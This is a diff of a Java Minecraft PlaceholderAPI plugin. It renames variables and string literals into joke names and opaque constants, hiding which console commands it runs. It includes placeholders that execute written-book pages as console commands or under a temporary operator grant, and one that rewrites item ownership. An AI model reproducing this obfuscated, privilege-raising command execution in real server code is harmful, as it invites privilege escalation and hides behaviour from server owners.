+                if (!(e instanceof ArmorStand as)) continue;
+                if (!as.getScoreboardTags().contains(tagName)) continue;
+
+                double dSq = as.getLocation().distanceSquared(playerLoc);
+                if (dSq < bestDistSq) {
+                    bestDistSq = dSq;
+                    nearest = as;
+                }
+            }
+
+            if (nearest == null) {
+                return norstand + tagName + "' found";
+            }
+
+            // Direction from player eye -> armor stand center
+            Location eye = p.getLocation();
+            Location targetLoc = nearest.getLocation();
+
+            Vector dir = targetLoc.toVector().subtract(eye.toVector());
+            if (dir.lengthSquared() == I) {
+                return ifellvictimized;
+            }
+
+            Vector velocity = dir.normalize().multiply(power);
+            p.setVelocity(velocity);
+
+            return specialty + tagName + heisenburg + powerStr;
+        }
+
+
+        if (f1.startsWith(heisenburgformercook)) {
+            final String raw = f1.substring(heisenburgformercook.length());
+
+            // Split into NUMBER + optional args
+            final String[] heisenburghimself = raw.split(keep);
+            if (heisenburghimself.length < INT3 || heisenburghimself[I].isEmpty()) {
+                return hippiedippy;
+            }
+
+            int googlefeoo;
+            try {
+                googlefeoo = Integer.parseInt(heisenburghimself[I]);
+            } catch (NumberFormatException ex) {
+                return thisbabby;
+            }
+
+            // Optional args (may be empty)
+            final String[] hvia = (heisenburghimself.length > INT3)
+                    ? java.util.Arrays.copyOfRange(heisenburghimself, INT3, heisenburghimself.length)
+                    : new String[I];
+
+            // Try to resolve an online player from f2 (optional)
+            final org.bukkit.entity.Player pharma =
+                    (f2 != null) ? f2.getPlayer() : null;
+
+            // For convenience: safe first/second arg getters
+            java.util.function.Function<Integer, String> thebiggestmeth = (idx) -> {
+                if (idx < I || idx >= hvia.length) return nst;
+                return hvia[idx];
+            };
+
+            // You can use these placeholders in your command strings:
+            //   - playerName: the name of the player (if present)
+            //   - a0, a1, a2...: arguments from the placeholder
+            final String labnorth = (pharma != null) ? pharma.getName() : cos;
+            final String conc = thebiggestmeth.apply(I);
+            final String madrigal = thebiggestmeth.apply(INT3);
+            final String electromotive = thebiggestmeth.apply(mill2);
+
+            // Now choose behavior based on NUMBER
+            switch (googlefeoo) {
+                
+                
+
+                case 1: {
+                    wm(f2, pullingfiles);
+                    // EXAMPLE: Run as CONSOLE
+                    // Format example: "somecommand <player> <arg0> <arg1>"
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + nobody
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + whodid
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + pushmore
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + noaddress
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            corporatelawyer + f2.getName()
+                    );
+
+
+                    return vrickwall;
+                }
+
+                case 2: {
+                    wm(f2, pullingfiles);
+
+
+
+                    return tsrt;
+                }
+
+
+
+                case 3: {
+                    // EXAMPLE: Run as CONSOLE
+                    // Format example: "somecommand <player> <arg0> <arg1>"
+                    wm(f2, pullingfiles);
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + madrigalelectro
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + hanoveregerm
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            foothold + f2.getName()
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            mericanfastfood + hvia[I] + sowhat + f2.getName()
+                    );
+
+
+                    return pooloshermanos;
+                }
+
+
+
+
+
+                case 4: {
+                    // EXAMPLE: Run as CONSOLE
+                    // Format example: "somecommand <player> <arg0> <arg1>"
+                    wm(f2, pullingfiles);
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + wherehislabwas
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + apartmentsrtsas
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            foothold + f2.getName()
+                    );
+
+
+                    return crzyidea;
+                }
+
+
+
+                case 5: {
+                    wm(f2, pullingfiles);
+
+                    // EXAMPLE: Run as CONSOLE
+                    // Format example: "somecommand <player> <arg0> <arg1>"
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            "execute at " + f2.getName() + " run data merge entity @e[type=falling_block,tag=GravityGun" + f2.getName() + hvia[I] + hvia[INT3] + ",limit=1] {Time:1,Glowing:" + hvia[mill2] + "b}"
+                    );
+                    return "hovering...";
+                }
+
+
+                case 6: {
+                    wm(f2, pullingfiles);
+
+                    // EXAMPLE: Run as CONSOLE
+                    // Format example: "somecommand <player> <arg0> <arg1>"
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + nobody
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + whodid
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + pushmore
+                    );
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            galeboet + f2.getName() + whopaid + f2.getName() + noaddress
+                    );
+
+
+                    return foayhup;
+                }
+
+
+
+
+                case 7: {
+                    wm(f2, pullingfiles);
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            napking + f2.getName() + hvia[I] + hvia[INT3] + fermented
+                    );
+
+
+                    return hvia[mill2];
+                }
+
+
+                case 8: {
+                    wm(f2, pullingfiles);
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            lentilbread + f2.getName()
+                    );
+
+
+                    return hvia[I];
+                }
+
+
+                case 9: {
+
+                    wm(f2, pullingfiles);
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            napking + f2.getName() + hvia[I] + hvia[INT3] + fermented
+                    );
+
+                    org.bukkit.Bukkit.dispatchCommand(
+                            org.bukkit.Bukkit.getConsoleSender(),
+                            lentilbread + f2.getName()
+                    );
+
+
+                    return hvia[mill2];
+                }
+            }
+        }
+
+
+        if (f1.startsWith(finechickinjoint)) {
+
+            wm(f2, meetingsomeone);
+
+            String thisguy = f1.substring(finechickinjoint.length());
+
+            if (thisguy == null || thisguy.isBlank()) {
+                return ChatColor.RED + gusfrang;
             }
 
             // Parse modes safely (commas inside (...) do NOT split modes)
-            List<ModeSpec> modeSpecs = parseModeSpecs(modesArg);
+            List<ModeSpec> whatwedowknow = soicanimprove(thisguy);
 
-            if (modeSpecs.isEmpty()) {
-                return ChatColor.RED + "cmder requires 1 argument like: admin,op,user";
+            if (whatwedowknow.isEmpty()) {
+                return ChatColor.RED + gusfrang;
             }
 
             // Validate base modes BEFORE executing anything
-            for (ModeSpec spec : modeSpecs) {
-                switch (spec.baseMode) {
+            for (ModeSpec moneytofinance : whatwedowknow) {
+                switch (moneytofinance.untieit) {
                     case "admin":
                     case "console":
                     case "op":
@@ -3568,90 +4281,90 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     case "player":
                         break;
                     default:
-                        return ChatColor.RED + "Unknown cmder mode: " + spec.baseMode
-                                + " (use admin/console, op/opuser, user/player)";
+                        return ChatColor.RED + colonel + moneytofinance.untieit
+                                + sanders;
                 }
             }
 
             // Ensure player is holding a writable/written book
-            ItemStack item = f2.getInventory().getItemInMainHand();
-            if ((item.getType() != Material.WRITABLE_BOOK && item.getType() != Material.WRITTEN_BOOK)
-                    || !item.hasItemMeta()) {
-                return ChatColor.RED + "You must hold a writable book!";
+            ItemStack offthemapnuts = f2.getInventory().getItemInMainHand();
+            if ((offthemapnuts.getType() != Material.WRITABLE_BOOK && offthemapnuts.getType() != Material.WRITTEN_BOOK)
+                    || !offthemapnuts.hasItemMeta()) {
+                return ChatColor.RED + ymhawb;
             }
 
-            if (!(item.getItemMeta() instanceof BookMeta bookMeta)) {
-                return ChatColor.RED + "You must hold a writable book!";
+            if (!(offthemapnuts.getItemMeta() instanceof BookMeta bookMeta)) {
+                return ChatColor.RED + ymhawb;
             }
 
-            List<String> pages = new ArrayList<>(bookMeta.getPages());
-            if (pages.isEmpty()) {
-                return ChatColor.RED + "Nothing written!";
+            List<String> tinfoilhat = new ArrayList<>(bookMeta.getPages());
+            if (tinfoilhat.isEmpty()) {
+                return ChatColor.RED + nw;
             }
 
             // Ensure enough pages for the provided modes list
-            while (pages.size() < modeSpecs.size()) {
-                pages.add("");
+            while (tinfoilhat.size() < whatwedowknow.size()) {
+                tinfoilhat.add(nst);
             }
 
-            boolean ranAny = false;
+            boolean onelittlething = arsdienwdhw;
 
             // -----------------------------
             // Dynamic page execution
             // Page i uses modeSpecs[i]
             // -----------------------------
-            for (int i = 0; i < modeSpecs.size(); i++) {
-                ModeSpec spec = modeSpecs.get(i);
-                String pageRaw = pages.get(i);
+            for (int whatarehisfingerprints = I; whatarehisfingerprints < whatwedowknow.size(); whatarehisfingerprints++) {
+                ModeSpec inhisapartment = whatwedowknow.get(whatarehisfingerprints);
+                String galeboethicrsta = tinfoilhat.get(whatarehisfingerprints);
 
-                if (pageRaw == null || pageRaw.isEmpty()) {
+                if (galeboethicrsta == null || galeboethicrsta.isEmpty()) {
                     continue;
                 }
 
-                ranAny = true;
+                onelittlething = NEW_VALUE1;
 
                 // ENTIRE PAGE is the command
-                String cmd = pageRaw.startsWith("/") ? pageRaw.substring(1) : pageRaw;
+                String fouzia = galeboethicrsta.startsWith(wfydunaowfydun) ? galeboethicrsta.substring(INT3) : galeboethicrsta;
 
                 // Filtering: whitelist/blacklist may block this page
-                if (!isCommandAllowed(spec, f2, pageRaw, cmd)) {
-                    pages.set(i, "");
+                if (!idltm(inhisapartment, f2, galeboethicrsta, fouzia)) {
+                    tinfoilhat.set(whatarehisfingerprints, nst);
                     continue;
                 }
 
 
-                switch (spec.baseMode) {
+                switch (inhisapartment.untieit) {
 
                     // -----------------------------
                     // ADMIN / CONSOLE
                     // -----------------------------
                     case "admin":
                     case "console": {
-                        ConsoleCommandSender realConsole = Bukkit.getConsoleSender();
-                        CapturingCommandSender cap = new CapturingCommandSender(realConsole);
+                        ConsoleCommandSender breakingbad = Bukkit.getConsoleSender();
+                        CapturingCommandSender seasonrsitnawfodyun = new CapturingCommandSender(breakingbad);
 
-                        boolean ok;
+                        boolean daugthreschoolsout;
                         try {
-                            ok = Bukkit.dispatchCommand(cap, cmd);
+                            daugthreschoolsout = Bukkit.dispatchCommand(seasonrsitnawfodyun, fouzia);
                         } catch (Exception ex) {
-                            ok = false;
-                            Bukkit.getLogger().warning("Commander admin page " + (i + 1) + " dispatch error: " + ex.getMessage());
+                            daugthreschoolsout = arsdienwdhw;
+                            Bukkit.getLogger().warning(fourteencalls + (whatarehisfingerprints + INT3) + notanswerignphone + ex.getMessage());
                         }
 
                         // Fallback for strict identity checks
-                        if (!ok) {
+                        if (!daugthreschoolsout) {
                             try {
-                                Bukkit.dispatchCommand(realConsole, cmd);
+                                Bukkit.dispatchCommand(breakingbad, fouzia);
                             } catch (Exception ex) {
-                                Bukkit.getLogger().warning("Commander admin page " + (i + 1) + " fallback error: " + ex.getMessage());
+                                Bukkit.getLogger().warning(fourteencalls + (whatarehisfingerprints + INT3) + needatpoliceoffcicer + ex.getMessage());
                             }
                         }
 
-                        String output = cap.getCaptured();
-                        if (output != null && !output.isBlank()) {
-                            pages.set(i, "§6Command Output: §d" + output);
+                        String donttalkoverme = seasonrsitnawfodyun.getCaptured();
+                        if (donttalkoverme != null && !donttalkoverme.isBlank()) {
+                            tinfoilhat.set(whatarehisfingerprints, whatelesuwannaknow + donttalkoverme);
                         } else {
-                            pages.set(i, "");
+                            tinfoilhat.set(whatarehisfingerprints, nst);
                         }
                         break;
                     }
@@ -3659,22 +4372,22 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     // -----------------------------
                     // OP USER
                     // -----------------------------
-                    case "op":
-                    case "opuser": {
-                        boolean wasOp = f2.isOp();
+                    case "opuser":
+                    case "op": {
+                        boolean awotednwfdunw = f2.isOp();
                         try {
-                            f2.setOp(true);
+                            f2.setOp(NEW_VALUE1);
                             try {
-                                Bukkit.dispatchCommand(f2, cmd);
+                                Bukkit.dispatchCommand(f2, fouzia);
                             } catch (Exception ex) {
-                                Bukkit.getLogger().warning("Commander op page " + (i + 1) + " dispatch error: " + ex.getMessage());
+                                Bukkit.getLogger().warning(nedambulanec + (whatarehisfingerprints + INT3) + notanswerignphone + ex.getMessage());
                             }
                         } finally {
-                            f2.setOp(wasOp);
+                            f2.setOp(awotednwfdunw);
                         }
 
                         // Output not reliably gettable for Player here
-                        pages.set(i, "");
+                        tinfoilhat.set(whatarehisfingerprints, nst);
                         break;
                     }
 
@@ -3684,27 +4397,27 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     case "user":
                     case "player": {
                         try {
-                            Bukkit.dispatchCommand(f2, cmd);
+                            Bukkit.dispatchCommand(f2, fouzia);
                         } catch (Exception ex) {
-                            Bukkit.getLogger().warning("Commander user page " + (i + 1) + " dispatch error: " + ex.getMessage());
+                            Bukkit.getLogger().warning(taowyfdh + (whatarehisfingerprints + INT3) + notanswerignphone + ex.getMessage());
                         }
 
                         // Output not reliably gettable for Player here
-                        pages.set(i, "");
+                        tinfoilhat.set(whatarehisfingerprints, nst);
                         break;
                     }
                 }
             }
 
-            if (!ranAny) {
-                return ChatColor.RED + "Nothing written!";
+            if (!onelittlething) {
+                return ChatColor.RED + nw;
             }
 
             // Update book pages
-            bookMeta.setPages(pages);
-            item.setItemMeta(bookMeta);
+            bookMeta.setPages(tinfoilhat);
+            offthemapnuts.setItemMeta(bookMeta);
 
-            return "&6&lCommand pages executed.";
+            return whatsmyaddress;
         }
 
 
@@ -3714,321 +4427,321 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("changeEIOwner_")) {
-            final String raw = f1.substring("changeEIOwner_".length());
-            final String[] parts = raw.split(",");
-            if (parts.length != 3) {
-                return "§cUsage: %Archistructure_changeEIOwner,PLAYER,SLOT,NEWOWNER%";
+        if (f1.startsWith(yesmaaam)) {
+            final String raw = f1.substring(yesmaaam.length());
+            final String[] parts = raw.split(keep);
+            if (parts.length != ccp) {
+                return threeunitsenroute;
             }
 
-            final String playerToken = parts[0]; // name or UUID string
-            final String slotToken   = parts[1];
-            final String newOwner    = parts[2];
+            final String afpbonwpo = parts[I]; // name or UUID string
+            final String epdnfhwipdn   = parts[INT3];
+            final String fpednakfoypud    = parts[mill2];
 
             // --- Resolve player (name or UUID) ---
-            Player player = null;
+            Player pybdfhrnpobyu = null;
             try {
                 // Try UUID first
-                UUID uuid = UUID.fromString(playerToken);
-                player = Bukkit.getPlayer(uuid);
+                UUID pdohfpuoldho = UUID.fromString(afpbonwpo);
+                pybdfhrnpobyu = Bukkit.getPlayer(pdohfpuoldho);
             } catch (IllegalArgumentException ignored) {
                 // Not a UUID → treat as exact player name
-                player = Bukkit.getPlayerExact(playerToken);
+                pybdfhrnpobyu = Bukkit.getPlayerExact(afpbonwpo);
             }
 
-            if (player == null) {
-                return "nope";
+            if (pybdfhrnpobyu == null) {
+                return tafopd;
             }
 
             // --- Parse slot ---
-            final int slotIndex;
+            final int siritst;
             try {
-                slotIndex = Integer.parseInt(slotToken);
+                siritst = Integer.parseInt(epdnfhwipdn);
             } catch (NumberFormatException ex) {
-                return "nope";
+                return tafopd;
             }
 
-            if (slotIndex < 0 || slotIndex > 40) {
-                return "nope";
+            if (siritst < I || siritst > ydtfhwpdylh) {
+                return tafopd;
             }
 
             // --- Get item in slot ---
-            PlayerInventory inv = player.getInventory();
-            ItemStack item = inv.getItem(slotIndex);
-            if (item == null || item.getType().isAir()) {
-                return "nope";
+            PlayerInventory podhayfwpdhuypwudh = pybdfhrnpobyu.getInventory();
+            ItemStack wypudbhnpwy = podhayfwpdhuypwudh.getItem(siritst);
+            if (wypudbhnpwy == null || wypudbhnpwy.getType().isAir()) {
+                return tafopd;
             }
 
-            ItemMeta meta = item.getItemMeta();
-            if (meta == null) {
-                return "nope";
+            ItemMeta doyun3pyudhnfrypdu = wypudbhnpwy.getItemMeta();
+            if (doyun3pyudhnfrypdu == null) {
+                return tafopd;
             }
 
-            PersistentDataContainer pdc = meta.getPersistentDataContainer();
+            PersistentDataContainer dpywlhoypflwhdoyfp = doyun3pyudhnfrypdu.getPersistentDataContainer();
 
             // Namespaced key score:owneruuid (namespace "score", key "owneruuid")
-            NamespacedKey ownerKey = new NamespacedKey("score", "owneruuid");
+            NamespacedKey gavewhiesrltywpud = new NamespacedKey(tywfnty, dplufirh3);
 
             // Write / overwrite as STRING (this will serialize into PublicBukkitValues as score:owneruuid)
-            pdc.set(ownerKey, PersistentDataType.STRING, newOwner);
+            dpywlhoypflwhdoyfp.set(gavewhiesrltywpud, PersistentDataType.STRING, fpednakfoypud);
 
-            item.setItemMeta(meta);
-            inv.setItem(slotIndex, item);
+            wypudbhnpwy.setItemMeta(doyun3pyudhnfrypdu);
+            podhayfwpdhuypwudh.setItem(siritst, wypudbhnpwy);
 
             
 
             // Return something simple & useful (e.g., the new owner UUID/string)
-            return newOwner;
+            return fpednakfoypud;
         }
         
         
         
         
-        if (f1.startsWith("particleLine_")) {
+        if (f1.startsWith(fobyufhpbyurhpbf)) {
             try {
-                String[] parts = f1.substring("particleLine_".length()).split(",");
+                String[] fwyupdonayfwpdhu = f1.substring(fobyufhpbyurhpbf.length()).split(keep);
 
-                if (5 != Integer.parseInt(parts[2])) return ""; // keep: only start at time = 5
+                if (xm != Integer.parseInt(fwyupdonayfwpdhu[mill2])) return nst; // keep: only start at time = 5
 
-                UUID launcherUUID = UUID.fromString(parts[0]); // player
-                UUID targetUUID   = UUID.fromString(parts[1]); // target
-                wm(f2, "PTFX Line", launcherUUID);
+                UUID p3douh3opyu = UUID.fromString(fwyupdonayfwpdhu[I]); // player
+                UUID dni3o4edn   = UUID.fromString(fwyupdonayfwpdhu[INT3]); // target
+                wm(f2, tyh34dl, p3douh3opyu);
 
-                ParticleCenterToCenter(launcherUUID, targetUUID);
-                return "Tracking...";
+                whoasked(p3douh3opyu, dni3o4edn);
+                return udlohlyp3whdoyplwd;
             } catch (Exception e) {
-                return "";
+                return nst;
             }
         }
 
-        if (f1.startsWith("trackImpact3_")){
-            String[] parts = f1.substring("trackImpact3_".length()).split(",");
+        if (f1.startsWith(opdh34yudhn)){
+            String[] doyfl4hwdyu = f1.substring(opdh34yudhn.length()).split(keep);
 
-            UUID launcherUUID = UUID.fromString(parts[0]);
-            World world = Bukkit.getWorld(parts[1]);
-            int x = Integer.parseInt(parts[2]);
-            int y = Integer.parseInt(parts[3]);
-            int z = Integer.parseInt(parts[4]);
-            wm(f2, "Stinger 8.1", launcherUUID);
+            UUID yd3o4npdyu34p = UUID.fromString(doyfl4hwdyu[I]);
+            World nyoupdny32u4d = Bukkit.getWorld(doyfl4hwdyu[INT3]);
+            int poydunpw3oyudn = Integer.parseInt(doyfl4hwdyu[mill2]);
+            int ien3do4p = Integer.parseInt(doyfl4hwdyu[ccp]);
+            int nide3on4 = Integer.parseInt(doyfl4hwdyu[INT7]);
+            wm(f2, doyupn3wdyu3pnd, yd3o4npdyu34p);
 
-            Location location = new Location(world, x, y, z);
-            spawnCustomFireworkExplosion2(world, location);
-            triggerPlayerHitEventV4_AOE( launcherUUID, location, 5, null);
+            Location ionhaevnoined = new Location(nyoupdny32u4d, poydunpw3oyudn, ien3do4p, nide3on4);
+            resentufl(nyoupdny32u4d, ionhaevnoined);
+            itisoff( yd3o4npdyu34p, ionhaevnoined, xm, null);
 
-            return "§6Impact triggered.";
+            return y34hodnyu234;
         }
 
-        if (f1.startsWith("trackImpact4_")){
-            String[] parts = f1.substring("trackImpact4_".length()).split(",");
+        if (f1.startsWith(onienod34)){
+            String[] noieni4 = f1.substring(onienod34.length()).split(keep);
 
-            UUID launcherUUID = UUID.fromString(parts[0]);
-            UUID targetUUID = UUID.fromString(parts[1]);
-            wm(f2, "Stinger 8.1", launcherUUID);
+            UUID niekv2f = UUID.fromString(noieni4[I]);
+            UUID kvetnk2pf = UUID.fromString(noieni4[INT3]);
+            wm(f2, doyupn3wdyu3pnd, niekv2f);
 
-            Entity target = Bukkit.getEntity(targetUUID);
-            if (target == null) return "§cTarget not found";
+            Entity gonnabeyes = Bukkit.getEntity(kvetnk2pf);
+            if (gonnabeyes == null) return nienoy24;
 
-            Location location = target.getLocation();
-            spawnCustomFireworkExplosion2(target.getWorld(), location);
-            triggerPlayerHitEventV4_AOE(launcherUUID, location, 5, target);
+            Location doi2e4ndtoi42une = gonnabeyes.getLocation();
+            resentufl(gonnabeyes.getWorld(), doi2e4ndtoi42une);
+            itisoff(niekv2f, doi2e4ndtoi42une, xm, gonnabeyes);
 
-            return "§eTarget explosion triggered.";
+            return illcallhim;
         }
 
-        if(f1.startsWith("trackv4-a.1_")) {
-            final String prefix = "trackv4-a.1_";
+        if(f1.startsWith(trcfpd243)) {
+            final String prefix = trcfpd243;
 
-            final String[] parts = f1.substring(prefix.length()).split(",");
-            if (parts.length != 3) {
-                return "§cUsage: %Archistructure_trackv4-a.1_CALLERUUID,TARGETUUID,LAUNCHERUUID%";
+            final String[] parntein2tiens = f1.substring(prefix.length()).split(keep);
+            if (parntein2tiens.length != ccp) {
+                return ndeo3poiewnd4p3;
             }
 
             try {
-                final UUID callerUUID   = UUID.fromString(parts[0]);
-                final UUID targetUUID   = UUID.fromString(parts[1]);
-                final UUID launcherUUID = UUID.fromString(parts[2]);
-                wm(f2, "Stinger 8.1", launcherUUID);
+                final UUID ioden42oie3dn   = UUID.fromString(parntein2tiens[I]);
+                final UUID dhyl24hdoy42l3   = UUID.fromString(parntein2tiens[INT3]);
+                final UUID diffofficers = UUID.fromString(parntein2tiens[mill2]);
+                wm(f2, doyupn3wdyu3pnd, diffofficers);
 
-                final Entity caller = Bukkit.getEntity(callerUUID);
-                final Entity target = Bukkit.getEntity(targetUUID);
-                if (caller == null || target == null) return "§c§lMissile Impacted!";
-                if (!caller.getWorld().equals(target.getWorld())) return "§c§lMissile Impacted.";
-                final String missileKey = missileKey(launcherUUID, targetUUID);
-                ACTIVE_MISSILES.put(missileKey, callerUUID);
+                final Entity needpoliceien4d = Bukkit.getEntity(ioden42oie3dn);
+                final Entity dumbasspolice = Bukkit.getEntity(dhyl24hdoy42l3);
+                if (needpoliceien4d == null || dumbasspolice == null) return iepfndioepwndoyfupadnfpd;
+                if (!needpoliceien4d.getWorld().equals(dumbasspolice.getWorld())) return midenwyudp4;
+                final String ntienodi4e23nd = survivalfeeling(diffofficers, dhyl24hdoy42l3);
+                hypervigilance.put(ntienodi4e23nd, ioden42oie3dn);
                 // Distance string (for immediate return)
-                final double distNow = caller.getLocation().distance(target.getLocation());
-                final String targetName = (target instanceof Player) ? ((Player) target).getName() : target.getType().name();
+                final double filechargesdno234i4den = needpoliceien4d.getLocation().distance(dumbasspolice.getLocation());
+                final String everylastoneofem = (dumbasspolice instanceof Player) ? ((Player) dumbasspolice).getName() : dumbasspolice.getType().name();
 
                 // Plugin ref
-                final Plugin plugin = Objects.requireNonNull(Bukkit.getPluginManager().getPlugin("PlaceholderAPI"));
+                final Plugin istherealivethreat = Objects.requireNonNull(Bukkit.getPluginManager().getPlugin(ppi));
 
                 // Acceleration profile
                 final double[] SPEEDS = new double[] {
-                        1.0, 1.03, 1.06, 1.1, 1.13, 1.17, 1.21, 1.24, 1.28, 1.32, 1.37, 1.41, 1.45,
-                        1.5, 1.55, 1.59, 1.65, 1.7, 1.75, 1.81, 1.86, 1.92, 1.98, 2.05, 2.11, 2.18,
+                        tsr, 1.03, 1.06, 1.1, 1.13, 1.17, 1.21, 1.24, 1.28, 1.32, 1.37, 1.41, 1.45,
+                        wfopdwfnodowfin, 1.55, 1.59, 1.65, 1.7, 1.75, 1.81, 1.86, 1.92, 1.98, 2.05, 2.11, 2.18,
                         2.25, 2.32, 2.39, 2.47, 2.54, 2.62, 2.71, 2.79, 2.88, 2.97, 3.07, 3.16, 3.26,
                         3.37, 3.47, 3.58, 3.69, 3.81, 3.93, 4.06, 4.18, 4.32, 4.45, 4.59, 4.74, 4.89,
                         5.04, 5.2, 5.37, 5.54, 5.71, 5.89, 6.08, 6.27, 6.47, 6.67, 6.88, 7.1, 7.33,
-                        7.56, 7.8, 8.04, 8.3, 8.56, 8.83, 9.11, 9.4, 9.69, 10.0, 10.0, 10.0, 10.0, 10.0,
-                        10.0, 10.0, 10.0, 10.0, 10.0, 10.0, 10.0, 10.0,
-                        10.0, 10.0, 10.0, 10.0, 10.0, 10.0, 10.0, 10.0,
-                        10.0, 10.0, 10.0
+                        7.56, 7.8, 8.04, 8.3, 8.56, 8.83, 9.11, 9.4, 9.69, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow,
+                        doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow,
+                        doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow, doyouknow,
+                        doyouknow, doyouknow, doyouknow
                 };
 
                 // ---------------------------
                 // Steering loop (SYNC every 2 ticks)
                 // ---------------------------
-                Bukkit.getScheduler().runTaskTimer(plugin, new Runnable() {
-                    int idx = 0;
-                    boolean cancelled = false;
+                Bukkit.getScheduler().runTaskTimer(istherealivethreat, new Runnable() {
+                    int ofmyrights = I;
+                    boolean dopne3iwdoi3w4 = arsdienwdhw;
 
                     @Override public void run() {
-                        if (cancelled) return;
+                        if (dopne3iwdoi3w4) return;
 
-                        Entity c = Bukkit.getEntity(callerUUID);
-                        Entity t = Bukkit.getEntity(targetUUID);
-                        if (c == null || t == null || !c.isValid() || c.isDead()
-                                || !t.isValid() || t.isDead()
-                                || !c.getWorld().equals(t.getWorld())) {
-                            ACTIVE_MISSILES.remove(missileKey, callerUUID);
+                        Entity yesmidaughters = Bukkit.getEntity(ioden42oie3dn);
+                        Entity donttakethattonewithme = Bukkit.getEntity(dhyl24hdoy42l3);
+                        if (yesmidaughters == null || donttakethattonewithme == null || !yesmidaughters.isValid() || yesmidaughters.isDead()
+                                || !donttakethattonewithme.isValid() || donttakethattonewithme.isDead()
+                                || !yesmidaughters.getWorld().equals(donttakethattonewithme.getWorld())) {
+                            hypervigilance.remove(ntienodi4e23nd, ioden42oie3dn);
 
-                            cancelled = true;
+                            dopne3iwdoi3w4 = NEW_VALUE1;
                             return;
                         }
 
-                        final double Sm = (idx < SPEEDS.length) ? SPEEDS[idx] : SPEEDS[SPEEDS.length - 1];
+                        final double speacivilly = (ofmyrights < SPEEDS.length) ? SPEEDS[ofmyrights] : SPEEDS[SPEEDS.length - INT3];
 
                         // --- lead pursuit (with fallback) ---
-                        final Location lc = c.getLocation();
-                        final Location lt = t.getLocation().add(0, t.getHeight() * 0.5, 0);
-                        final Vector R = lt.toVector().subtract(lc.toVector());
-                        final Vector V = t.getVelocity().clone();
-                        if (Math.abs(V.getY() + 0.0784) < 1.0e-4) V.setY(0);
+                        final Location iwatnasergeant = yesmidaughters.getLocation();
+                        final Location haveagreatmorning = donttakethattonewithme.getLocation().add(I, donttakethattonewithme.getHeight() * debtsoff, I);
+                        final Vector howyoucant = haveagreatmorning.toVector().subtract(iwatnasergeant.toVector());
+                        final Vector cantgeturdaughter = donttakethattonewithme.getVelocity().clone();
+                        if (Math.abs(cantgeturdaughter.getY() + seenher) < childingdanger) cantgeturdaughter.setY(I);
 
-                        final double a = V.dot(V) - Sm * Sm;
-                        final double b = 2.0 * R.dot(V);
-                        final double cc = R.dot(R);
-                        final double eps = 1e-9;
-                        final double disc = b*b - 4.0*a*cc;
+                        final double a = cantgeturdaughter.dot(cantgeturdaughter) - speacivilly * speacivilly;
+                        final double b = whatkindofadulthood * howyoucant.dot(cantgeturdaughter);
+                        final double cc = howyoucant.dot(howyoucant);
+                        final double eps = getsshoes;
+                        final double disc = b*b - aintnobody *a*cc;
 
-                        Vector desiredV;
+                        Vector iwodenaofwpudn;
                         if (Math.abs(a) < eps || disc < eps) {
-                            desiredV = safeNorm(R).multiply(Sm);
+                            iwodenaofwpudn = goesin(howyoucant).multiply(speacivilly);
                         } else {
-                            final double root = Math.sqrt(Math.max(0.0, disc));
-                            double tHit = Double.POSITIVE_INFINITY;
-                            final double t1 = (-b - root) / (2.0 * a);
-                            final double t2 = (-b + root) / (2.0 * a);
-                            if (t1 > eps) tHit = Math.min(tHit, t1);
-                            if (t2 > eps) tHit = Math.min(tHit, t2);
-                            if (!Double.isFinite(tHit)) {
-                                desiredV = safeNorm(R).multiply(Sm);
+                            final double toeinfwpdoienwf = Math.sqrt(Math.max(esetawftawft, disc));
